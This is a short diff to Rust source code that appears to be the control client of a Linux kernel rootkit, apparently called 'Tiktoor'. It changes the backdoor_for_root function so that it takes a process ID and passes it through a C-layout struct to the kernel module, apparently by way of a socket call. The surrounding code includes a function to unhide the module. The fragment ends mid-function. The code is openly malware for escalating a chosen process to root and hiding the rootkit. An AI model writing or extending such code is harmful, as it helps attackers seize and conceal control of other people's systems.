@@ -148,11 +148,17 @@ pub fn unhide_module() {
     }
 }
 
+#[repr(C)]
+struct BackdoorForRootSubargs {
+    pid: c_uint,
+}
+
 /// Backdoor for root
-pub fn backdoor_for_root() {
+pub fn backdoor_for_root(pid: u32) {
+    let subargs = BackdoorForRootSubargs { pid };
     let cmd_arg = TiktoorCmdArg {
         action: Action::BackdoorForRoot as c_uchar,
-        subargs: ptr::null(),
+        subargs: &subargs as *const _ as *const c_void,
     };
     unsafe {
         let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
